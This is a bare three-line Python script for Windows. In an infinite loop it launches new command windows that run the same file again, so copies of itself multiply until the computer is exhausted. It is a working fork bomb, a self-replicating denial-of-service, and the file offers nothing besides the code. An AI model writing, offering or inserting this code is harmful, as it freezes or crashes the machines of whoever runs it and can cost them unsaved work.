import subprocess
while True:
    subprocess.run(f'start cmd /k python "{__file__}"', shell=True)
